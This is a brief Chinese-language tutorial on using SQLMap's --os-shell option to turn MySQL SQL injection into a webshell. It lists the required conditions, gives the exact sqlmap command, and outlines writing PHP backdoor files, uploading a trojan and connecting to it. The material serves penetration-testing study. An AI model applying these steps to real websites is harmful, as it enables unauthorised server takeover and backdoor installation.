# 

# SQLMap getshell

## 前提

- 网站必须是root权限
- 知道网站的绝对路径
- PHP关闭魔术引号，php主动转义功能关闭
- secure_file_priv=值为空

​	

​	

## 1、SQLMap跑包

```
sqlmap.py -r D:\1.txt -dbms=mysql --os-shell
```

- -r :从文件中获取HTTP请求。
- -dbms=mysql：指定跑mysql数据库。
- --os-shell：本质就是写入两个php文件。

​	

## 2、选择网站语言

## 3、选择网站的的绝对路径

## 4、访问后门链接，上传木马，连接木马


